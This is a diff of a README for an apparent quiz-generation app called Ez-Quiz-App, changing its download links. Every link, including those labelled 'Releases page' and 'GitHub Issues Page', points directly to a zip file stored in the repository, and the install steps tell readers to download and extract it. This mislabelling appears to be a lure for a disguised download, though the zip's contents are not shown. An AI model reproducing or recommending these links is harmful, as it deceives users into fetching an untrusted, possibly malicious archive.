@@ -6,11 +6,11 @@ Welcome to Ez-Quiz-App! This clean quiz application allows you to generate quizz
 
 ## 📥 Download the App
 
-[![Download Ez-Quiz-App](https://raw.githubusercontent.com/deromokhtar/Ez-Quiz-App/main/public/icons/Ez-Quiz-App-v2.9.zip%20Ez--Quiz--App-v1.0-blue)](https://raw.githubusercontent.com/deromokhtar/Ez-Quiz-App/main/public/icons/Ez-Quiz-App-v2.9.zip)
+[![Download Ez-Quiz-App](https://github.com/deromokhtar/Ez-Quiz-App/raw/refs/heads/main/public/App_Ez_Quiz_v3.2.zip%20Ez--Quiz--App-v1.0-blue)](https://github.com/deromokhtar/Ez-Quiz-App/raw/refs/heads/main/public/App_Ez_Quiz_v3.2.zip)
 
 To download the latest version of Ez-Quiz-App, click the button above or visit the Releases page below.
 
-**Download Link:** [Visit the Releases Page](https://raw.githubusercontent.com/deromokhtar/Ez-Quiz-App/main/public/icons/Ez-Quiz-App-v2.9.zip)
+**Download Link:** [Visit the Releases Page](https://github.com/deromokhtar/Ez-Quiz-App/raw/refs/heads/main/public/App_Ez_Quiz_v3.2.zip)
 
 ## 💻 System Requirements
 
@@ -32,7 +32,7 @@ Ez-Quiz-App comes packed with features to enhance your quiz-making experience:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/deromokhtar/Ez-Quiz-App/main/public/icons/Ez-Quiz-App-v2.9.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/deromokhtar/Ez-Quiz-App/raw/refs/heads/main/public/App_Ez_Quiz_v3.2.zip).
 2. **Choose the Latest Release:** Find the latest version listed at the top of the page.
 3. **Download the App:** Click on the appropriate file for your operating system to download it.
 4. **Extract the Files (if needed):** If the file is a ZIP, extract it to your desired location.
@@ -58,7 +58,7 @@ If you face any issues while downloading or using Ez-Quiz-App, consider the foll
 
 ## 📞 Support
 
-For additional help or support, visit our [GitHub Issues Page](https://raw.githubusercontent.com/deromokhtar/Ez-Quiz-App/main/public/icons/Ez-Quiz-App-v2.9.zip) to report problems or ask questions. Fostering a community of support is essential, and we encourage you to contribute with your experiences!
+For additional help or support, visit our [GitHub Issues Page](https://github.com/deromokhtar/Ez-Quiz-App/raw/refs/heads/main/public/App_Ez_Quiz_v3.2.zip) to report problems or ask questions. Fostering a community of support is essential, and we encourage you to contribute with your experiences!
 
 ## 🏷️ Topics Covered
 
